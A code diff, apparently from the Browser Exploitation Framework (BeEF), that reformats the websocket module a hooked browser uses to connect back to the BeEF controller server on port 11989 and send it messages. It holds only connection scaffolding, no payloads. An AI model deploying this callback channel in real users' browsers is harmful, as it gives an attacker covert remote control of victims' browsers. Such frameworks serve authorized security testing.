@@ -16,37 +16,39 @@
 
 //beef.websocket.socket.send(take answer to server beef)
 /*New browser init call this */
+
 beef.websocket = {
 
-    socket: null,
+    socket:null,
 
-    init: function(){
-        var webSocketServer=beef.net.host;
-        var webSocketPort=11989;
-        if(beef.browser.isFF()){
-            this.socket = new MozWebSocket("ws://"+webSocketServer+":"+webSocketPort+"/");
-        }else{
-            this.socket = new WebSocket("ws://"+webSocketServer+":"+webSocketPort+"/");
+    init:function () {
+        var webSocketServer = beef.net.host;
+        var webSocketPort = 11989;
+        //@todo ceck if we have to use wss or ws we need a globalvalue
+        if (beef.browser.isFF()) {
+            beef.websocket.socket = new MozWebSocket("ws://" + webSocketServer + ":" + webSocketPort + "/");
+
+        } else {
+            beef.websocket.socket = new WebSocket("ws://" + webSocketServer + ":" + webSocketPort + "/");
+
         }
+
     },
     /*websocket send Helo to beef server and start async communication*/
-    start:function(){
-        console.log("started ws \n");
-
+    start:function () {
         new beef.websocket.init();
-           /*so the server is just up we need send helo id @todo insert browser ID where can i get them?*/
-
-        this.socket.onopen = function(){
+        /*so the server is just up we need send helo id @todo insert browser ID where can i get them?*/
+        this.socket.onopen = function () {
             console.log("Socket has been opened!");
-            this.send("Helo"+"myid00");
+            beef.websocket.send("helo");
             console.log("Connected and Helo");
         }
 
     },
 
-    send:function(data){
-       this.socket.send(data);
-       console.log("Sent [" + data + "]");
+    send:function (data) {
+        this.socket.send(data);
+        console.log("Sent [" + data + "]");
     }
 
 };
